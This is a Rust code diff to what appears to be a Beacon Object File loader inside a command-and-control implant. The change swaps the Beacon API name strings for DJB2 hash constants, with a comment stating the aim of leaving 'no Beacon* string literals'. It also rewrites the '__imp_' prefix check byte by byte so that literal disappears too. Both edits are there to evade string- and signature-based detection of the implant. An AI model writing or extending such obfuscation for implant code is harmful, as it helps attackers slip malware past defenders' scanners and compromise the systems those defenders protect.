@@ -341,34 +341,41 @@ unsafe extern "C" fn beacon_noop_2(_a: usize, _b: usize) -> usize { 0 }
 unsafe extern "C" fn beacon_noop_4(_a: usize, _b: usize, _c: usize, _d: usize) -> usize { 0 }
 unsafe extern "C" fn beacon_noop_7(_a: usize, _b: usize, _c: usize, _d: usize, _e: usize, _f: usize, _g: usize) -> usize { 0 }
 
-// ── Beacon API name → function pointer ───────────────────────────────────────
+// ── BOF callback API — DJB2 hash table (no Beacon* string literals) ──────────
+
+fn bof_djb2(s: &str) -> u32 {
+    let mut h: u32 = 5381;
+    for b in s.bytes() { h = h.wrapping_shl(5).wrapping_add(h) ^ (b as u32); }
+    h
+}
 
 fn beacon_api_lookup(name: &str) -> usize {
-    match name {
-        "BeaconDataParse"              => beacon_data_parse        as usize,
-        "BeaconDataInt"                => beacon_data_int          as usize,
-        "BeaconDataShort"              => beacon_data_short        as usize,
-        "BeaconDataLength"             => beacon_data_length       as usize,
-        "BeaconDataExtract"            => beacon_data_extract      as usize,
-        "BeaconOutput"                 => beacon_output            as usize,
-        "BeaconPrintf"                 => beacon_printf            as usize,
-        "BeaconFormatAlloc"            => beacon_format_alloc      as usize,
-        "BeaconFormatReset"            => beacon_format_reset      as usize,
-        "BeaconFormatFree"             => beacon_format_free       as usize,
-        "BeaconFormatAppend"           => beacon_format_append     as usize,
-        "BeaconFormatPrintf"           => beacon_format_printf     as usize,
-        "BeaconFormatToString"         => beacon_format_to_string  as usize,
-        "BeaconFormatInt"              => beacon_format_int        as usize,
-        "BeaconIsAdmin"                => beacon_is_admin          as usize,
-        "BeaconGetSpawnTo"             => beacon_get_spawn_to      as usize,
-        "toWideChar"                   => to_wide_char             as usize,
-        "BeaconInjectProcess"          => beacon_noop_7            as usize,
-        "BeaconInjectTemporaryProcess" => beacon_noop_7            as usize,
-        "BeaconCleanupProcess"         => beacon_noop_1            as usize,
-        "BeaconSpawnTemporaryProcess"  => beacon_noop_4            as usize,
-        "BeaconRevertToken"            => beacon_noop_0            as usize,
-        "BeaconUseToken"               => beacon_noop_1            as usize,
-        "BeaconSetSleep"               => beacon_noop_2            as usize,
+    let h = bof_djb2(name);
+    match h {
+        0x6AB4F0E4 => beacon_data_parse        as usize,
+        0x0D4393E2 => beacon_data_int           as usize,
+        0x6AA76263 => beacon_data_short         as usize,
+        0x025056ED => beacon_data_length        as usize,
+        0x222914DC => beacon_data_extract       as usize,
+        0x4862655E => beacon_output             as usize,
+        0x51E86B76 => beacon_printf             as usize,
+        0xA0F210CF => beacon_format_alloc       as usize,
+        0xA1B55237 => beacon_format_reset       as usize,
+        0xF55C31F6 => beacon_format_free        as usize,
+        0xBF7A316C => beacon_format_append      as usize,
+        0xE45DFB35 => beacon_format_printf      as usize,
+        0xEF693D8C => beacon_format_to_string   as usize,
+        0x5502EE31 => beacon_format_int         as usize,
+        0xB4D2F8B4 => beacon_is_admin           as usize,
+        0x1A46AB57 => beacon_get_spawn_to       as usize,
+        0x5C5E4379 => to_wide_char              as usize,
+        0x681A2615 => beacon_noop_7             as usize,
+        0x8F9FB24E => beacon_noop_7             as usize,
+        0x9909426A => beacon_noop_1             as usize,
+        0x3A9E0DAA => beacon_noop_4             as usize,
+        0x4BE276B8 => beacon_noop_0             as usize,
+        0x0338FF39 => beacon_noop_1             as usize,
+        0x1EB39E2C => beacon_noop_2             as usize,
         _ => 0,
     }
 }
@@ -376,7 +383,8 @@ fn beacon_api_lookup(name: &str) -> usize {
 // ── Resolve external symbol → 8-byte thunk ───────────────────────────────────
 
 unsafe fn resolve_external(name: &str, allocs: &mut Vec<usize>) -> Result<usize, String> {
-    if !name.starts_with("__imp_") {
+    let b = name.as_bytes();
+    if b.len() < 6 || b[0]!=b'_'||b[1]!=b'_'||b[2]!=b'i'||b[3]!=b'm'||b[4]!=b'p'||b[5]!=b'_' {
         return Ok(0);
     }
     let imp_name = &name[6..];
